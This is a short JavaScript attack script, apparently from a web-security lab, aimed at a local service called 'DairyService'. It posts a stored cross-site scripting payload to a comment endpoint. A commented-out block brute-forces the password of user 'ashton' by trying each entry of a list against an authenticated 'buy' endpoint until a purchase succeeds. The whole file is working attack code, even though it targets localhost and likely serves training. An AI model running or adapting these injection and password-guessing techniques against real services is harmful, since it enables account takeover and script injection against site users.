console.log("run");
fetch(`http://localhost:8188/DairyService.svc/comment?name=a`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify(`<h1 onmouseover=alert("Hello")>aaa</h1>`),
});
/*
breakB =false
console.log("here")
list.forEach(element => {
  var xhr = new XMLHttpRequest();
  xhr.open(
    "GET",
    `${Surl}/Service.svc/buy?id=248309245`,
    true,
    "ashton",
    element
  );
  xhr.withCredentials = true;
  xhr.addEventListener("readystatechange", function() {
    if(this.readyState === 4) {
      if(this.responseText.includes("Fault ")){
      }else{
        if(this.responseText.includes("Thank you for purchasing Fromage frais fruit")){
          document.getElementById("works").innerHTML+=`<br>${element}<br>`;
          console.log(this.responseText)
          breakB = true
        }
      }
    }
  });
  xhr.send();
  //console.log(xhr.status);
});
//*/
